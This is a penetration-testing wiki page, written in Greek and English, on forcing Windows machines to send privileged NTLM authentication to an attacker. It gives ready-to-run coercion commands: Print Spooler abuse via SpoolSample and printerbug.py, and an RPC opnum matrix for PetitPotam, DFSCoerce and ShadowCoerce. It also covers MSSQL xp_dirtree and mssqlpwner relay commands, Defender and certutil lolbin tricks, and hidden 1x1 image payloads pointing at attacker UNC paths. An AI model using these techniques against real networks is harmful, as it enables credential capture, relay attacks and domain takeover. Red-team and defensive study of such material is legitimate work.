# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **remote authentication triggers** γραμμένα σε C# χρησιμοποιώντας τον MIDL compiler για την αποφυγή εξαρτήσεων από τρίτους.

## Spooler Service Abuse

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
Σημείωση: όταν ο εκτυπωτής στέλνει την ειδοποίηση σε οποιοδήποτε σύστημα, χρειάζεται να **authenticate against** εκείνο το **system**. Επομένως, ένας επιτιθέμενος μπορεί να αναγκάσει την υπηρεσία _**Print Spooler**_ να authenticate against ένα αυθαίρετο σύστημα, και η υπηρεσία θα **use the computer account** σε αυτή την authentication διαδικασία.

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Εντοπισμός υπηρεσιών Spooler σε ακρόαση

Χρησιμοποιώντας μια ελαφρώς τροποποιημένη έκδοση του @mysmartlogin (του Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), ελέγξτε αν το Spooler Service βρίσκεται σε ακρόαση:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Μπορείτε επίσης να χρησιμοποιήσετε το rpcdump.py σε Linux και να αναζητήσετε το MS-RPRN Protocol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Ζητήστε από την υπηρεσία να αυθεντικοποιηθεί απέναντι σε έναν αυθαίρετο host

Μπορείτε να μεταγλωττίσετε το [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ή χρησιμοποιήστε [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν βρίσκεστε σε Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Συνδυασμός με Unconstrained Delegation

Εάν ένας επιτιθέμενος έχει ήδη παραβιάσει έναν υπολογιστή με [Unconstrained Delegation](unconstrained-delegation.md), μπορεί να **αναγκάσει τον εκτυπωτή να πιστοποιηθεί προς αυτόν τον υπολογιστή**. Εξαιτίας της unconstrained delegation, το **TGT** του **computer account του εκτυπωτή** θα **αποθηκευτεί στη μνήμη** του υπολογιστή με unconstrained delegation. Δεδομένου ότι ο επιτιθέμενος έχει ήδη παραβιάσει αυτό το host, θα μπορεί να **ανακτήσει αυτό το ticket** και να το καταχραστεί ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Σημείωση: Αυτές οι μέθοδοι δέχονται παραμέτρους που μπορούν να περιέχουν ένα UNC path (π.χ., `\\attacker\share`). Όταν επεξεργαστούν, τα Windows θα πιστοποιηθούν (στο πλαίσιο machine/user) προς αυτό το UNC, επιτρέποντας την καταγραφή ή relay του NetNTLM.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: ο στόχος προσπαθεί να ανοίξει την παρεχόμενη διαδρομή backup log και πιστοποιείται προς το attacker-controlled UNC.
- Practical use: εξαναγκασμός Tier 0 assets (DC/RODC/Citrix/etc.) να εκπέμψουν NetNTLM, στη συνέχεια relay προς AD CS endpoints (ESC8/ESC11 scenarios) ή άλλες υπηρεσίες με προνόμια.

## PrivExchange

Η επίθεση `PrivExchange` είναι αποτέλεσμα ενός σφάλματος που βρέθηκε στη λειτουργία `PushSubscription` του Exchange Server. Αυτή η λειτουργία επιτρέπει στον Exchange server να εξαναγκαστεί από οποιονδήποτε domain user με mailbox να πιστοποιηθεί προς οποιονδήποτε client-provided host μέσω HTTP.

Κατά προεπιλογή, η υπηρεσία Exchange τρέχει ως SYSTEM και έχει υπερβολικά προνόμια (συγκεκριμένα, έχει WriteDacl privileges στο domain πριν από το Cumulative Update του 2019). Αυτό το σφάλμα μπορεί να εκμεταλλευτεί για να επιτρέψει το relaying πληροφοριών προς LDAP και στη συνέχεια την εξαγωγή της βάσης δεδομένων NTDS του domain. Σε περιπτώσεις όπου το relaying προς LDAP δεν είναι δυνατό, αυτό το σφάλμα μπορεί να χρησιμοποιηθεί για relaying και πιστοποίηση προς άλλους hosts εντός του domain. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση σε Domain Admin χρησιμοποιώντας οποιονδήποτε authenticated domain user account.

## Μέσα στα Windows

Εάν βρίσκεστε ήδη μέσα στη μηχανή Windows μπορείτε να αναγκάσετε τα Windows να συνδεθούν σε έναν server χρησιμοποιώντας privileged accounts με:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ή χρησιμοποιήστε αυτή την άλλη τεχνική: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατό να χρησιμοποιηθεί το certutil.exe lolbin (Microsoft-signed binary) για να εξαναγκάσει NTLM authentication:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Μέσω email

Αν γνωρίζεις την **διεύθυνση email** του χρήστη που συνδέεται σε μια μηχανή που θέλεις να παραβιάσεις, μπορείς απλά να του στείλεις ένα **email με μια εικόνα 1x1** όπως
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
και όταν το ανοίξει, θα προσπαθήσει να πιστοποιηθεί.

### MitM

Αν μπορείς να πραγματοποιήσεις MitM attack σε έναν υπολογιστή και να εισάγεις HTML σε μια σελίδα που θα δει, μπορείς να δοκιμάσεις να εισάγεις μια εικόνα όπως η ακόλουθη στη σελίδα:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Άλλοι τρόποι για να εξαναγκάσετε και να phish το NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Εάν μπορείτε να καταγράψετε [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Θυμηθείτε ότι για να crack το NTLMv1 πρέπει να ρυθμίσετε το Responder challenge σε "1122334455667788"_

## Αναφορές
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
